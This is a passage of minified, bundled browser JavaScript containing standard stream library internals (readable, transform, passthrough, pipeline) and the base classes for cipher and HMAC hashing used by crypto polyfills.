        var ye, be = Object.create(ue, (ye = {},
        M(ye, K, {
            value: pe,
            writable: !0
        }),
        M(ye, w, {
            value: null,
            writable: !0
        }),
        M(ye, b, {
            value: null,
            writable: !0
        }),
        M(ye, X, {
            value: null,
            writable: !0
        }),
        M(ye, Y, {
            value: pe._readableState.endEmitted,
            writable: !0
        }),
        M(ye, V, {
            value: function(Ae, Ee) {
                var Be = be[K].read();
                Be ? (be[F] = null,
                be[w] = null,
                be[b] = null,
                Ae(Q(Be, !1))) : (be[w] = Ae,
                be[b] = Ee)
            },
            writable: !0
        }),
        ye));
        return be[F] = null,
        x(pe, function(xe) {
            if (xe && xe.code !== "ERR_STREAM_PREMATURE_CLOSE") {
                var Ae = be[b];
                Ae !== null && (be[F] = null,
                be[w] = null,
                be[b] = null,
                Ae(xe)),
                be[X] = xe;
                return
            }
            var Ee = be[w];
            Ee !== null && (be[F] = null,
            be[w] = null,
            be[b] = null,
            Ee(Q(void 0, !0))),
            be[Y] = !0
        }),
        pe.on("readable", ae.bind(null, be)),
        be
    };
    return async_iterator = fe,
    async_iterator
}
var fromBrowser, hasRequiredFromBrowser;
function requireFromBrowser() {
    return hasRequiredFromBrowser || (hasRequiredFromBrowser = 1,
    fromBrowser = function() {
        throw new Error("Readable.from is not available in the browser")
    }
    ),
    fromBrowser
}
var _stream_readable$1, hasRequired_stream_readable$1;
function require_stream_readable$1() {
    if (hasRequired_stream_readable$1)
        return _stream_readable$1;
    hasRequired_stream_readable$1 = 1,
    _stream_readable$1 = Ee;
    var _;
    Ee.ReadableState = Ae,
    requireEvents$1().EventEmitter;
    var M = function(qe, Ve) {
        return qe.listeners(Ve).length
    }
      , j = requireStreamBrowser$1()
      , O = requireDist$4().Buffer
      , x = (typeof window < "u" || typeof window < "u" ? window : typeof self < "u" ? self : {}).Uint8Array || function() {}
    ;
    function w(Ne) {
        return O.from(Ne)
    }
    function b(Ne) {
        return O.isBuffer(Ne) || Ne instanceof x
    }
    var X = requireUtil$3(), Y;
    X && X.debuglog ? Y = X.debuglog("stream") : Y = function() {}
    ;
    var F = requireBuffer_list(), V = requireDestroy$1(), K = requireState(), Q = K.getHighWaterMark, ee = requireErrorsBrowser().codes, ae = ee.ERR_INVALID_ARG_TYPE, ne = ee.ERR_STREAM_PUSH_AFTER_EOF, oe = ee.ERR_METHOD_NOT_IMPLEMENTED, ue = ee.ERR_STREAM_UNSHIFT_AFTER_END_EVENT, fe, he, pe;
    requireInherits_browser()(Ee, j);
    var ye = V.errorOrDestroy
      , be = ["error", "close", "destroy", "pause", "resume"];
    function xe(Ne, qe, Ve) {
        if (typeof Ne.prependListener == "function")
            return Ne.prependListener(qe, Ve);
        !Ne._events || !Ne._events[qe] ? Ne.on(qe, Ve) : Array.isArray(Ne._events[qe]) ? Ne._events[qe].unshift(Ve) : Ne._events[qe] = [Ve, Ne._events[qe]]
    }
    function Ae(Ne, qe, Ve) {
        _ = _ || require_stream_duplex$1(),
        Ne = Ne || {},
        typeof Ve != "boolean" && (Ve = qe instanceof _),
        this.objectMode = !!Ne.objectMode,
        Ve && (this.objectMode = this.objectMode || !!Ne.readableObjectMode),
        this.highWaterMark = Q(this, Ne, "readableHighWaterMark", Ve),
        this.buffer = new F,
        this.length = 0,
        this.pipes = null,
        this.pipesCount = 0,
        this.flowing = null,
        this.ended = !1,
        this.endEmitted = !1,
        this.reading = !1,
        this.sync = !0,
        this.needReadable = !1,
        this.emittedReadable = !1,
        this.readableListening = !1,
        this.resumeScheduled = !1,
        this.paused = !0,
        this.emitClose = Ne.emitClose !== !1,
        this.autoDestroy = !!Ne.autoDestroy,
        this.destroyed = !1,
        this.defaultEncoding = Ne.defaultEncoding || "utf8",
        this.awaitDrain = 0,
        this.readingMore = !1,
        this.decoder = null,
        this.encoding = null,
        Ne.encoding && (fe || (fe = requireString_decoder().StringDecoder),
        this.decoder = new fe(Ne.encoding),
        this.encoding = Ne.encoding)
    }
    function Ee(Ne) {
        if (_ = _ || require_stream_duplex$1(),
        !(this instanceof Ee))
            return new Ee(Ne);
        var qe = this instanceof _;
        this._readableState = new Ae(Ne,this,qe),
        this.readable = !0,
        Ne && (typeof Ne.read == "function" && (this._read = Ne.read),
        typeof Ne.destroy == "function" && (this._destroy = Ne.destroy)),
        j.call(this)
    }
    Object.defineProperty(Ee.prototype, "destroyed", {
        enumerable: !1,
        get: function() {
            return this._readableState === void 0 ? !1 : this._readableState.destroyed
        },
        set: function(qe) {
            this._readableState && (this._readableState.destroyed = qe)
        }
    }),
    Ee.prototype.destroy = V.destroy,
    Ee.prototype._undestroy = V.undestroy,
    Ee.prototype._destroy = function(Ne, qe) {
        qe(Ne)
    }
    ,
    Ee.prototype.push = function(Ne, qe) {
        var Ve = this._readableState, lt;
        return Ve.objectMode ? lt = !0 : typeof Ne == "string" && (qe = qe || Ve.defaultEncoding,
        qe !== Ve.encoding && (Ne = O.from(Ne, qe),
        qe = ""),
        lt = !0),
        Be(this, Ne, qe, !1, lt)
    }
    ,
    Ee.prototype.unshift = function(Ne) {
        return Be(this, Ne, null, !0, !1)
    }
    ;
    function Be(Ne, qe, Ve, lt, nt) {
        Y("readableAddChunk", qe);
        var je = Ne._readableState;
        if (qe === null)
            je.reading = !1,
            te(Ne, je);
        else {
            var Ke;
            if (nt || (Ke = q(je, qe)),
            Ke)
                ye(Ne, Ke);
            else if (je.objectMode || qe && qe.length > 0)
                if (typeof qe != "string" && !je.objectMode && Object.getPrototypeOf(qe) !== O.prototype && (qe = w(qe)),
                lt)
                    je.endEmitted ? ye(Ne, new ue) : ce(Ne, je, qe, !0);
                else if (je.ended)
                    ye(Ne, new ne);
                else {
                    if (je.destroyed)
                        return !1;
                    je.reading = !1,
                    je.decoder && !Ve ? (qe = je.decoder.write(qe),
                    je.objectMode || qe.length !== 0 ? ce(Ne, je, qe, !1) : re(Ne, je)) : ce(Ne, je, qe, !1)
                }
            else
                lt || (je.reading = !1,
                re(Ne, je))
        }
        return !je.ended && (je.length < je.highWaterMark || je.length === 0)
    }
    function ce(Ne, qe, Ve, lt) {
        qe.flowing && qe.length === 0 && !qe.sync ? (qe.awaitDrain = 0,
        Ne.emit("data", Ve)) : (qe.length += qe.objectMode ? 1 : Ve.length,
        lt ? qe.buffer.unshift(Ve) : qe.buffer.push(Ve),
        qe.needReadable && se(Ne)),
        re(Ne, qe)
    }
    function q(Ne, qe) {
        var Ve;
        return !b(qe) && typeof qe != "string" && qe !== void 0 && !Ne.objectMode && (Ve = new ae("chunk",["string", "Buffer", "Uint8Array"],qe)),
        Ve
    }
    Ee.prototype.isPaused = function() {
        return this._readableState.flowing === !1
    }
    ,
    Ee.prototype.setEncoding = function(Ne) {
        fe || (fe = requireString_decoder().StringDecoder);
        var qe = new fe(Ne);
        this._readableState.decoder = qe,
        this._readableState.encoding = this._readableState.decoder.encoding;
        for (var Ve = this._readableState.buffer.head, lt = ""; Ve !== null; )
            lt += qe.write(Ve.data),
            Ve = Ve.next;
        return this._readableState.buffer.clear(),
        lt !== "" && this._readableState.buffer.push(lt),
        this._readableState.length = lt.length,
        this
    }
    ;
    var L = 1073741824;
    function U(Ne) {
        return Ne >= L ? Ne = L : (Ne--,
        Ne |= Ne >>> 1,
        Ne |= Ne >>> 2,
        Ne |= Ne >>> 4,
        Ne |= Ne >>> 8,
        Ne |= Ne >>> 16,
        Ne++),
        Ne
    }
    function Z(Ne, qe) {
        return Ne <= 0 || qe.length === 0 && qe.ended ? 0 : qe.objectMode ? 1 : Ne !== Ne ? qe.flowing && qe.length ? qe.buffer.head.data.length : qe.length : (Ne > qe.highWaterMark && (qe.highWaterMark = U(Ne)),
        Ne <= qe.length ? Ne : qe.ended ? qe.length : (qe.needReadable = !0,
        0))
    }
    Ee.prototype.read = function(Ne) {
        Y("read", Ne),
        Ne = parseInt(Ne, 10);
        var qe = this._readableState
          , Ve = Ne;
        if (Ne !== 0 && (qe.emittedReadable = !1),
        Ne === 0 && qe.needReadable && ((qe.highWaterMark !== 0 ? qe.length >= qe.highWaterMark : qe.length > 0) || qe.ended))
            return Y("read: emitReadable", qe.length, qe.ended),
            qe.length === 0 && qe.ended ? Le(this) : se(this),
            null;
        if (Ne = Z(Ne, qe),
        Ne === 0 && qe.ended)
            return qe.length === 0 && Le(this),
            null;
        var lt = qe.needReadable;
        Y("need readable", lt),
        (qe.length === 0 || qe.length - Ne < qe.highWaterMark) && (lt = !0,
        Y("length less than watermark", lt)),
        qe.ended || qe.reading ? (lt = !1,
        Y("reading or ended", lt)) : lt && (Y("do read"),
        qe.reading = !0,
        qe.sync = !0,
        qe.length === 0 && (qe.needReadable = !0),
        this._read(qe.highWaterMark),
        qe.sync = !1,
        qe.reading || (Ne = Z(Ve, qe)));
        var nt;
        return Ne > 0 ? nt = Te(Ne, qe) : nt = null,
        nt === null ? (qe.needReadable = qe.length <= qe.highWaterMark,
        Ne = 0) : (qe.length -= Ne,
        qe.awaitDrain = 0),
        qe.length === 0 && (qe.ended || (qe.needReadable = !0),
        Ve !== Ne && qe.ended && Le(this)),
        nt !== null && this.emit("data", nt),
        nt
    }
    ;
    function te(Ne, qe) {
        if (Y("onEofChunk"),
        !qe.ended) {
            if (qe.decoder) {
                var Ve = qe.decoder.end();
                Ve && Ve.length && (qe.buffer.push(Ve),
                qe.length += qe.objectMode ? 1 : Ve.length)
            }
            qe.ended = !0,
            qe.sync ? se(Ne) : (qe.needReadable = !1,
            qe.emittedReadable || (qe.emittedReadable = !0,
            de(Ne)))
        }
    }
    function se(Ne) {
        var qe = Ne._readableState;
        Y("emitReadable", qe.needReadable, qe.emittedReadable),
        qe.needReadable = !1,
        qe.emittedReadable || (Y("emitReadable", qe.flowing),
        qe.emittedReadable = !0,
        process$1.nextTick(de, Ne))
    }
    function de(Ne) {
        var qe = Ne._readableState;
        Y("emitReadable_", qe.destroyed, qe.length, qe.ended),
        !qe.destroyed && (qe.length || qe.ended) && (Ne.emit("readable"),
        qe.emittedReadable = !1),
        qe.needReadable = !qe.flowing && !qe.ended && qe.length <= qe.highWaterMark,
        Ie(Ne)
    }
    function re(Ne, qe) {
        qe.readingMore || (qe.readingMore = !0,
        process$1.nextTick($, Ne, qe))
    }
    function $(Ne, qe) {
        for (; !qe.reading && !qe.ended && (qe.length < qe.highWaterMark || qe.flowing && qe.length === 0); ) {
            var Ve = qe.length;
            if (Y("maybeReadMore read 0"),
            Ne.read(0),
            Ve === qe.length)
                break
        }
        qe.readingMore = !1
    }
    Ee.prototype._read = function(Ne) {
        ye(this, new oe("_read()"))
    }
    ,
    Ee.prototype.pipe = function(Ne, qe) {
        var Ve = this
          , lt = this._readableState;
        switch (lt.pipesCount) {
        case 0:
            lt.pipes = Ne;
            break;
        case 1:
            lt.pipes = [lt.pipes, Ne];
            break;
        default:
            lt.pipes.push(Ne);
            break
        }
        lt.pipesCount += 1,
        Y("pipe count=%d opts=%j", lt.pipesCount, qe);
        var nt = (!qe || qe.end !== !1) && Ne !== process$1.stdout && Ne !== process$1.stderr
          , je = nt ? Qe : st;
        lt.endEmitted ? process$1.nextTick(je) : Ve.once("end", je),
        Ne.on("unpipe", Ke);
        function Ke(et, tt) {
            Y("onunpipe"),
            et === Ve && tt && tt.hasUnpiped === !1 && (tt.hasUnpiped = !0,
            ct())
        }
        function Qe() {
            Y("onend"),
            Ne.end()
        }
        var We = ie(Ve);
        Ne.on("drain", We);
        var mt = !1;
        function ct() {
            Y("cleanup"),
            Ne.removeListener("close", _e),
            Ne.removeListener("finish", Ce),
            Ne.removeListener("drain", We),
            Ne.removeListener("error", we),
            Ne.removeListener("unpipe", Ke),
            Ve.removeListener("end", Qe),
            Ve.removeListener("end", st),
            Ve.removeListener("data", vt),
            mt = !0,
            lt.awaitDrain && (!Ne._writableState || Ne._writableState.needDrain) && We()
        }
        Ve.on("data", vt);
        function vt(et) {
            Y("ondata");
            var tt = Ne.write(et);
            Y("dest.write", tt),
            tt === !1 && ((lt.pipesCount === 1 && lt.pipes === Ne || lt.pipesCount > 1 && $e(lt.pipes, Ne) !== -1) && !mt && (Y("false write response, pause", lt.awaitDrain),
            lt.awaitDrain++),
            Ve.pause())
        }
        function we(et) {
            Y("onerror", et),
            st(),
            Ne.removeListener("error", we),
            M(Ne, "error") === 0 && ye(Ne, et)
        }
        xe(Ne, "error", we);
        function _e() {
            Ne.removeListener("finish", Ce),
            st()
        }
        Ne.once("close", _e);
        function Ce() {
            Y("onfinish"),
            Ne.removeListener("close", _e),
            st()
        }
        Ne.once("finish", Ce);
        function st() {
            Y("unpipe"),
            Ve.unpipe(Ne)
        }
        return Ne.emit("pipe", Ve),
        lt.flowing || (Y("pipe resume"),
        Ve.resume()),
        Ne
    }
    ;
    function ie(Ne) {
        return function() {
            var Ve = Ne._readableState;
            Y("pipeOnDrain", Ve.awaitDrain),
            Ve.awaitDrain && Ve.awaitDrain--,
            Ve.awaitDrain === 0 && M(Ne, "data") && (Ve.flowing = !0,
            Ie(Ne))
        }
    }
    Ee.prototype.unpipe = function(Ne) {
        var qe = this._readableState
          , Ve = {
            hasUnpiped: !1
        };
        if (qe.pipesCount === 0)
            return this;
        if (qe.pipesCount === 1)
            return Ne && Ne !== qe.pipes ? this : (Ne || (Ne = qe.pipes),
            qe.pipes = null,
            qe.pipesCount = 0,
            qe.flowing = !1,
            Ne && Ne.emit("unpipe", this, Ve),
            this);
        if (!Ne) {
            var lt = qe.pipes
              , nt = qe.pipesCount;
            qe.pipes = null,
            qe.pipesCount = 0,
            qe.flowing = !1;
            for (var je = 0; je < nt; je++)
                lt[je].emit("unpipe", this, {
                    hasUnpiped: !1
                });
            return this
        }
        var Ke = $e(qe.pipes, Ne);
        return Ke === -1 ? this : (qe.pipes.splice(Ke, 1),
        qe.pipesCount -= 1,
        qe.pipesCount === 1 && (qe.pipes = qe.pipes[0]),
        Ne.emit("unpipe", this, Ve),
        this)
    }
    ,
    Ee.prototype.on = function(Ne, qe) {
        var Ve = j.prototype.on.call(this, Ne, qe)
          , lt = this._readableState;
        return Ne === "data" ? (lt.readableListening = this.listenerCount("readable") > 0,
        lt.flowing !== !1 && this.resume()) : Ne === "readable" && !lt.endEmitted && !lt.readableListening && (lt.readableListening = lt.needReadable = !0,
        lt.flowing = !1,
        lt.emittedReadable = !1,
        Y("on readable", lt.length, lt.reading),
        lt.length ? se(this) : lt.reading || process$1.nextTick(ge, this)),
        Ve
    }
    ,
    Ee.prototype.addListener = Ee.prototype.on,
    Ee.prototype.removeListener = function(Ne, qe) {
        var Ve = j.prototype.removeListener.call(this, Ne, qe);
        return Ne === "readable" && process$1.nextTick(ve, this),
        Ve
    }
    ,
    Ee.prototype.removeAllListeners = function(Ne) {
        var qe = j.prototype.removeAllListeners.apply(this, arguments);
        return (Ne === "readable" || Ne === void 0) && process$1.nextTick(ve, this),
        qe
    }
    ;
    function ve(Ne) {
        var qe = Ne._readableState;
        qe.readableListening = Ne.listenerCount("readable") > 0,
        qe.resumeScheduled && !qe.paused ? qe.flowing = !0 : Ne.listenerCount("data") > 0 && Ne.resume()
    }
    function ge(Ne) {
        Y("readable nexttick read 0"),
        Ne.read(0)
    }
    Ee.prototype.resume = function() {
        var Ne = this._readableState;
        return Ne.flowing || (Y("resume"),
        Ne.flowing = !Ne.readableListening,
        Re(this, Ne)),
        Ne.paused = !1,
        this
    }
    ;
    function Re(Ne, qe) {
        qe.resumeScheduled || (qe.resumeScheduled = !0,
        process$1.nextTick(Pe, Ne, qe))
    }
    function Pe(Ne, qe) {
        Y("resume", qe.reading),
        qe.reading || Ne.read(0),
        qe.resumeScheduled = !1,
        Ne.emit("resume"),
        Ie(Ne),
        qe.flowing && !qe.reading && Ne.read(0)
    }
    Ee.prototype.pause = function() {
        return Y("call pause flowing=%j", this._readableState.flowing),
        this._readableState.flowing !== !1 && (Y("pause"),
        this._readableState.flowing = !1,
        this.emit("pause")),
        this._readableState.paused = !0,
        this
    }
    ;
    function Ie(Ne) {
        var qe = Ne._readableState;
        for (Y("flow", qe.flowing); qe.flowing && Ne.read() !== null; )
            ;
    }
    Ee.prototype.wrap = function(Ne) {
        var qe = this
          , Ve = this._readableState
          , lt = !1;
        Ne.on("end", function() {
            if (Y("wrapped end"),
            Ve.decoder && !Ve.ended) {
                var Ke = Ve.decoder.end();
                Ke && Ke.length && qe.push(Ke)
            }
            qe.push(null)
        }),
        Ne.on("data", function(Ke) {
            if (Y("wrapped data"),
            Ve.decoder && (Ke = Ve.decoder.write(Ke)),
            !(Ve.objectMode && Ke == null) && !(!Ve.objectMode && (!Ke || !Ke.length))) {
                var Qe = qe.push(Ke);
                Qe || (lt = !0,
                Ne.pause())
            }
        });
        for (var nt in Ne)
            this[nt] === void 0 && typeof Ne[nt] == "function" && (this[nt] = function(Qe) {
                return function() {
                    return Ne[Qe].apply(Ne, arguments)
                }
            }(nt));
        for (var je = 0; je < be.length; je++)
            Ne.on(be[je], this.emit.bind(this, be[je]));
        return this._read = function(Ke) {
            Y("wrapped _read", Ke),
            lt && (lt = !1,
            Ne.resume())
        }
        ,
        this
    }
    ,
    typeof Symbol == "function" && (Ee.prototype[Symbol.asyncIterator] = function() {
        return he === void 0 && (he = requireAsync_iterator()),
        he(this)
    }
    ),
    Object.defineProperty(Ee.prototype, "readableHighWaterMark", {
        enumerable: !1,
        get: function() {
            return this._readableState.highWaterMark
        }
    }),
    Object.defineProperty(Ee.prototype, "readableBuffer", {
        enumerable: !1,
        get: function() {
            return this._readableState && this._readableState.buffer
        }
    }),
    Object.defineProperty(Ee.prototype, "readableFlowing", {
        enumerable: !1,
        get: function() {
            return this._readableState.flowing
        },
        set: function(qe) {
            this._readableState && (this._readableState.flowing = qe)
        }
    }),
    Ee._fromList = Te,
    Object.defineProperty(Ee.prototype, "readableLength", {
        enumerable: !1,
        get: function() {
            return this._readableState.length
        }
    });
    function Te(Ne, qe) {
        if (qe.length === 0)
            return null;
        var Ve;
        return qe.objectMode ? Ve = qe.buffer.shift() : !Ne || Ne >= qe.length ? (qe.decoder ? Ve = qe.buffer.join("") : qe.buffer.length === 1 ? Ve = qe.buffer.first() : Ve = qe.buffer.concat(qe.length),
        qe.buffer.clear()) : Ve = qe.buffer.consume(Ne, qe.decoder),
        Ve
    }
    function Le(Ne) {
        var qe = Ne._readableState;
        Y("endReadable", qe.endEmitted),
        qe.endEmitted || (qe.ended = !0,
        process$1.nextTick(Ze, qe, Ne))
    }
    function Ze(Ne, qe) {
        if (Y("endReadableNT", Ne.endEmitted, Ne.length),
        !Ne.endEmitted && Ne.length === 0 && (Ne.endEmitted = !0,
        qe.readable = !1,
        qe.emit("end"),
        Ne.autoDestroy)) {
            var Ve = qe._writableState;
            (!Ve || Ve.autoDestroy && Ve.finished) && qe.destroy()
        }
    }
    typeof Symbol == "function" && (Ee.from = function(Ne, qe) {
        return pe === void 0 && (pe = requireFromBrowser()),
        pe(Ee, Ne, qe)
    }
    );
    function $e(Ne, qe) {
        for (var Ve = 0, lt = Ne.length; Ve < lt; Ve++)
            if (Ne[Ve] === qe)
                return Ve;
        return -1
    }
    return _stream_readable$1
}
var _stream_transform$1, hasRequired_stream_transform$1;
function require_stream_transform$1() {
    if (hasRequired_stream_transform$1)
        return _stream_transform$1;
    hasRequired_stream_transform$1 = 1,
    _stream_transform$1 = X;
    var _ = requireErrorsBrowser().codes
      , M = _.ERR_METHOD_NOT_IMPLEMENTED
      , j = _.ERR_MULTIPLE_CALLBACK
      , O = _.ERR_TRANSFORM_ALREADY_TRANSFORMING
      , x = _.ERR_TRANSFORM_WITH_LENGTH_0
      , w = require_stream_duplex$1();
    requireInherits_browser()(X, w);
    function b(V, K) {
        var Q = this._transformState;
        Q.transforming = !1;
        var ee = Q.writecb;
        if (ee === null)
            return this.emit("error", new j);
        Q.writechunk = null,
        Q.writecb = null,
        K != null && this.push(K),
        ee(V);
        var ae = this._readableState;
        ae.reading = !1,
        (ae.needReadable || ae.length < ae.highWaterMark) && this._read(ae.highWaterMark)
    }
    function X(V) {
        if (!(this instanceof X))
            return new X(V);
        w.call(this, V),
        this._transformState = {
            afterTransform: b.bind(this),
            needTransform: !1,
            transforming: !1,
            writecb: null,
            writechunk: null,
            writeencoding: null
        },
        this._readableState.needReadable = !0,
        this._readableState.sync = !1,
        V && (typeof V.transform == "function" && (this._transform = V.transform),
        typeof V.flush == "function" && (this._flush = V.flush)),
        this.on("prefinish", Y)
    }
    function Y() {
        var V = this;
        typeof this._flush == "function" && !this._readableState.destroyed ? this._flush(function(K, Q) {
            F(V, K, Q)
        }) : F(this, null, null)
    }
    X.prototype.push = function(V, K) {
        return this._transformState.needTransform = !1,
        w.prototype.push.call(this, V, K)
    }
    ,
    X.prototype._transform = function(V, K, Q) {
        Q(new M("_transform()"))
    }
    ,
    X.prototype._write = function(V, K, Q) {
        var ee = this._transformState;
        if (ee.writecb = Q,
        ee.writechunk = V,
        ee.writeencoding = K,
        !ee.transforming) {
            var ae = this._readableState;
            (ee.needTransform || ae.needReadable || ae.length < ae.highWaterMark) && this._read(ae.highWaterMark)
        }
    }
    ,
    X.prototype._read = function(V) {
        var K = this._transformState;
        K.writechunk !== null && !K.transforming ? (K.transforming = !0,
        this._transform(K.writechunk, K.writeencoding, K.afterTransform)) : K.needTransform = !0
    }
    ,
    X.prototype._destroy = function(V, K) {
        w.prototype._destroy.call(this, V, function(Q) {
            K(Q)
        })
    }
    ;
    function F(V, K, Q) {
        if (K)
            return V.emit("error", K);
        if (Q != null && V.push(Q),
        V._writableState.length)
            throw new x;
        if (V._transformState.transforming)
            throw new O;
        return V.push(null)
    }
    return _stream_transform$1
}
var _stream_passthrough$1, hasRequired_stream_passthrough$1;
function require_stream_passthrough$1() {
    if (hasRequired_stream_passthrough$1)
        return _stream_passthrough$1;
    hasRequired_stream_passthrough$1 = 1,
    _stream_passthrough$1 = M;
    var _ = require_stream_transform$1();
    requireInherits_browser()(M, _);
    function M(j) {
        if (!(this instanceof M))
            return new M(j);
        _.call(this, j)
    }
    return M.prototype._transform = function(j, O, x) {
        x(null, j)
    }
    ,
    _stream_passthrough$1
}
var pipeline_1, hasRequiredPipeline;
function requirePipeline() {
    if (hasRequiredPipeline)
        return pipeline_1;
    hasRequiredPipeline = 1;
    var _;
    function M(Q) {
        var ee = !1;
        return function() {
            ee || (ee = !0,
            Q.apply(void 0, arguments))
        }
    }
    var j = requireErrorsBrowser().codes
      , O = j.ERR_MISSING_ARGS
      , x = j.ERR_STREAM_DESTROYED;
    function w(Q) {
        if (Q)
            throw Q
    }
    function b(Q) {
        return Q.setHeader && typeof Q.abort == "function"
    }
    function X(Q, ee, ae, ne) {
        ne = M(ne);
        var oe = !1;
        Q.on("close", function() {
            oe = !0
        }),
        _ === void 0 && (_ = requireEndOfStream()),
        _(Q, {
            readable: ee,
            writable: ae
        }, function(fe) {
            if (fe)
                return ne(fe);
            oe = !0,
            ne()
        });
        var ue = !1;
        return function(fe) {
            if (!oe && !ue) {
                if (ue = !0,
                b(Q))
                    return Q.abort();
                if (typeof Q.destroy == "function")
                    return Q.destroy();
                ne(fe || new x("pipe"))
            }
        }
    }
    function Y(Q) {
        Q()
    }
    function F(Q, ee) {
        return Q.pipe(ee)
    }
    function V(Q) {
        return !Q.length || typeof Q[Q.length - 1] != "function" ? w : Q.pop()
    }
    function K() {
        for (var Q = arguments.length, ee = new Array(Q), ae = 0; ae < Q; ae++)
            ee[ae] = arguments[ae];
        var ne = V(ee);
        if (Array.isArray(ee[0]) && (ee = ee[0]),
        ee.length < 2)
            throw new O("streams");
        var oe, ue = ee.map(function(fe, he) {
            var pe = he < ee.length - 1
              , ye = he > 0;
            return X(fe, pe, ye, function(be) {
                oe || (oe = be),
                be && ue.forEach(Y),
                !pe && (ue.forEach(Y),
                ne(oe))
            })
        });
        return ee.reduce(F)
    }
    return pipeline_1 = K,
    pipeline_1
}
var streamBrowserify, hasRequiredStreamBrowserify;
function requireStreamBrowserify() {
    if (hasRequiredStreamBrowserify)
        return streamBrowserify;
    hasRequiredStreamBrowserify = 1,
    streamBrowserify = j;
    var _ = requireEvents$1().EventEmitter
      , M = requireInherits_browser();
    M(j, _),
    j.Readable = require_stream_readable$1(),
    j.Writable = require_stream_writable$1(),
    j.Duplex = require_stream_duplex$1(),
    j.Transform = require_stream_transform$1(),
    j.PassThrough = require_stream_passthrough$1(),
    j.finished = requireEndOfStream(),
    j.pipeline = requirePipeline(),
    j.Stream = j;
    function j() {
        _.call(this)
    }
    return j.prototype.pipe = function(O, x) {
        var w = this;
        function b(ee) {
            O.writable && O.write(ee) === !1 && w.pause && w.pause()
        }
        w.on("data", b);
        function X() {
            w.readable && w.resume && w.resume()
        }
        O.on("drain", X),
        !O._isStdio && (!x || x.end !== !1) && (w.on("end", F),
        w.on("close", V));
        var Y = !1;
        function F() {
            Y || (Y = !0,
            O.end())
        }
        function V() {
            Y || (Y = !0,
            typeof O.destroy == "function" && O.destroy())
        }
        function K(ee) {
            if (Q(),
            _.listenerCount(this, "error") === 0)
                throw ee
        }
        w.on("error", K),
        O.on("error", K);
        function Q() {
            w.removeListener("data", b),
            O.removeListener("drain", X),
            w.removeListener("end", F),
            w.removeListener("close", V),
            w.removeListener("error", K),
            O.removeListener("error", K),
            w.removeListener("end", Q),
            w.removeListener("close", Q),
            O.removeListener("close", Q)
        }
        return w.on("end", Q),
        w.on("close", Q),
        O.on("close", Q),
        O.emit("pipe", w),
        O
    }
    ,
    streamBrowserify
}
var cipherBase, hasRequiredCipherBase;
function requireCipherBase() {
    if (hasRequiredCipherBase)
        return cipherBase;
    hasRequiredCipherBase = 1;
    var _ = requireSafeBuffer$1().Buffer
      , M = requireStreamBrowserify().Transform
      , j = requireString_decoder().StringDecoder
      , O = requireInherits_browser();
    function x(Y) {
        M.call(this),
        this.hashMode = typeof Y == "string",
        this.hashMode ? this[Y] = this._finalOrDigest : this.final = this._finalOrDigest,
        this._final && (this.__final = this._final,
        this._final = null),
        this._decoder = null,
        this._encoding = null
    }
    O(x, M);
    var w = typeof Uint8Array < "u"
      , b = typeof ArrayBuffer < "u" && typeof Uint8Array < "u" && ArrayBuffer.isView && (_.prototype instanceof Uint8Array || _.TYPED_ARRAY_SUPPORT);
    function X(Y, F) {
        if (Y instanceof _)
            return Y;
        if (typeof Y == "string")
            return _.from(Y, F);
        if (b && ArrayBuffer.isView(Y)) {
            if (Y.byteLength === 0)
                return _.alloc(0);
            var V = _.from(Y.buffer, Y.byteOffset, Y.byteLength);
            if (V.byteLength === Y.byteLength)
                return V
        }
        if (w && Y instanceof Uint8Array || _.isBuffer(Y) && Y.constructor && typeof Y.constructor.isBuffer == "function" && Y.constructor.isBuffer(Y))
            return _.from(Y);
        throw new TypeError('The "data" argument must be of type string or an instance of Buffer, TypedArray, or DataView.')
    }
    return x.prototype.update = function(Y, F, V) {
        var K = X(Y, F)
          , Q = this._update(K);
        return this.hashMode ? this : (V && (Q = this._toString(Q, V)),
        Q)
    }
    ,
    x.prototype.setAutoPadding = function() {}
    ,
    x.prototype.getAuthTag = function() {
        throw new Error("trying to get auth tag in unsupported state")
    }
    ,
    x.prototype.setAuthTag = function() {
        throw new Error("trying to set auth tag in unsupported state")
    }
    ,
    x.prototype.setAAD = function() {
        throw new Error("trying to set aad in unsupported state")
    }
    ,
    x.prototype._transform = function(Y, F, V) {
        var K;
        try {
            this.hashMode ? this._update(Y) : this.push(this._update(Y))
        } catch (Q) {
            K = Q
        } finally {
            V(K)
        }
    }
    ,
    x.prototype._flush = function(Y) {
        var F;
        try {
            this.push(this.__final())
        } catch (V) {
            F = V
        }
        Y(F)
    }
    ,
    x.prototype._finalOrDigest = function(Y) {
        var F = this.__final() || _.alloc(0);
        return Y && (F = this._toString(F, Y, !0)),
        F
    }
    ,
    x.prototype._toString = function(Y, F, V) {
        if (this._decoder || (this._decoder = new j(F),
        this._encoding = F),
        this._encoding !== F)
            throw new Error("cant switch encodings");
        var K = this._decoder.write(Y);
        return V && (K += this._decoder.end()),
        K
    }
    ,
    cipherBase = x,
    cipherBase
}
var legacy, hasRequiredLegacy;
function requireLegacy() {
    if (hasRequiredLegacy)
        return legacy;
    hasRequiredLegacy = 1;
    var _ = requireInherits_browser()
      , M = requireSafeBuffer$1().Buffer
      , j = requireCipherBase()
      , O = M.alloc(128)
      , x = 64;
    function w(b, X) {
        j.call(this, "digest"),
        typeof X == "string" && (X = M.from(X)),
        this._alg = b,
        this._key = X,
        X.length > x ? X = b(X) : X.length < x && (X = M.concat([X, O], x));
        for (var Y = this._ipad = M.allocUnsafe(x), F = this._opad = M.allocUnsafe(x), V = 0; V < x; V++)
            Y[V] = X[V] ^ 54,
            F[V] = X[V] ^ 92;
        this._hash = [Y]
    }
    return _(w, j),
    w.prototype._update = function(b) {
        this._hash.push(b)
    }
    ,
    w.prototype._final = function() {
        var b = this._alg(M.concat(this._hash));
        return this._alg(M.concat([this._opad, b]))
    }
    ,
    legacy = w,
    legacy
}
var readableBrowser$1 = {
    exports: {}
}, hasRequiredReadableBrowser$1;
function requireReadableBrowser$1() {
    return hasRequiredReadableBrowser$1 || (hasRequiredReadableBrowser$1 = 1,
    function(_, M) {
        M = _.exports = require_stream_readable$1(),
        M.Stream = M,
        M.Readable = M,
        M.Writable = require_stream_writable$1(),
        M.Duplex = require_stream_duplex$1(),
        M.Transform = require_stream_transform$1(),
        M.PassThrough = require_stream_passthrough$1(),
        M.finished = requireEndOfStream(),
        M.pipeline = requirePipeline()
    }(readableBrowser$1, readableBrowser$1.exports)),
    readableBrowser$1.exports
}
var hashBase, hasRequiredHashBase;
function requireHashBase() {
    if (hasRequiredHashBase)
        return hashBase;
    hasRequiredHashBase = 1;
    var _ = requireSafeBuffer$1().Buffer
      , M = requireReadableBrowser$1().Transform
